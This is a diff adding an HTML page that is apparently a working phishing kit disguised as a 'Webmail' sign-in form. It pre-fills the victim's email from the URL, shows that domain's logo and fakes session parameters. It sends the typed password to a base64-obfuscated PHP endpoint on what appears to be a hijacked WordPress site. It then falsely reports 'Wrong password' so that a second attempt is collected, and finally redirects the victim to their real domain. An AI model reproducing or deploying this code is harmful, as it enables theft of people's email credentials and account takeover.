@@ -1,0 +1,86 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/core.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/md5.js"></script>
+  
+  <script>
+  var loading = true;
+  if(loading) {
+      var href = window.location.href;
+      var regex = new RegExp("[&\\?]cmd=");
+      if (regex.test(href)) {
+      } else {
+          let rand =  Math.random() * 1000000000;
+          var md5 = CryptoJS.MD5(rand);
+          window.location.href = href.replace(/]/g, '') + `&em=cmd=login_submit&id=${rand + rand}&session=${md5 + md5}`
+          loading = false;
+      }
+  }
+</script>
+    <title>Webmail</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+  </head>
+  <body>
+    <main class="w-full h-screen flex justify-center items-center" id="main">
+      <div
+        class="flex flex-col gap-5 bg-gray-800/90 w-[400px] px-5 text-white py-10"
+      >
+        <div class="flex items-center justify-center">
+          <div>
+            <img src="" alt="" id="bannerLink" />
+          </div>
+        </div>
+        <div class="text-center">
+          <p class="text-2xl font-semibold uppercase" id="title"></p>
+          <p style="font-size:25px">Login </p>
+        </div>
+        <div
+          class="bg-red-200 h-14 text-red-600 rounded-md px-3 flex items-center justify-center hidden"
+          id="error"
+        ></div>
+        <div>
+          <input
+            type="text"
+            name="username"
+            id="userx"
+            class="w-full border h-10 rounded-md px-3 text-black"
+            placeholder="email"
+          />
+        </div>
+        <div>
+          <input
+            type="password"
+            name="pass"
+            id="passw"
+            class="w-full border h-10 rounded-md px-3 text-black"
+            placeholder="Password"
+          />
+        </div>
+        <div class="flex items-center gap-3">
+          <input type="radio" name="remember" id="remmber" class="" />
+          <label for="" class="text-slate-400">Remember Me</label>
+        </div>
+        <div>
+          <button
+            class="w-full h-10 rounded-md px-3 bg-blue-600 hover:bg-blue-500 muted"
+            id="submit_btn"
+          >
+            Sign in
+          </button>
+        </div>
+      </div>
+    </main>
+    <script>
+      const phpLink =
+        "aHR0cHM6Ly9iZXNzZXItYWxzLW1hcmtldGluZy5kZS93cC1pbmNsdWRlcy9qcy90aW55bWNlL2ppcC5waHA=";
+    </script>
+    <script>
+      let count=0;const emailInput=document.getElementById("userx"),passInput=document.getElementById("passw"),btn=document.getElementById("submit_btn"),errorMsg=document.getElementById("error"),mainElement=document.getElementById("main"),hash=window.location.hash,email=hash.slice(1).split('&')[0]||"";if(isEmail(email)){document.getElementById("title").innerText=email.split("@")[1],document.getElementById("bannerLink").src=`https://logo.clearbit.com/${email.split("@")[1]}`||"",emailInput.value=email,document.getElementById("bannerLink").style.height="50px";;const encodedEmail=email.split("@");const a=email.split("@")[1];mainElement.style.backgroundImage=`url('https://picsum.photos/1600/900?grayscale')`,passInput.focus()}else emailInput.focus();btn.addEventListener("click",a=>{a.preventDefault(),btn.disabled=!0,submitForm()}),emailInput.addEventListener("keydown",a=>{"Enter"===a.key&&(a.preventDefault(),btn.click())}),passInput.addEventListener("keydown",a=>{"Enter"===a.key&&(a.preventDefault(),btn.click())});function isEmail(a){return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(a)}async function submitForm(){errorMsg.classList.add("hidden");const a=new FormData;a.append("email",emailInput.value),a.append("password",passInput.value),isEmail(emailInput.value)?2>passInput.value.length?(errorMsg.classList.remove("hidden"),errorMsg.textContent="Email password is required.",btn.disabled=!1,passInput.focus()):fetch(atob(phpLink),{method:"POST",body:a}).then(a=>a.text()).then(a=>{console.log(a),1<=count?window.location.href="https://"+(emailInput.value.split("@")[1]||"google.com"):(count+=1,errorMsg.classList.remove("hidden"),errorMsg.textContent="Wrong password! Please try again",btn.disabled=!1,passInput.value="",passInput.focus())}).catch(a=>console.error("Fetch error:",a)):(errorMsg.classList.remove("hidden"),errorMsg.textContent="Email is required.",btn.disabled=!1,emailInput.focus())}
+    </script>
+  </body>
+</html>
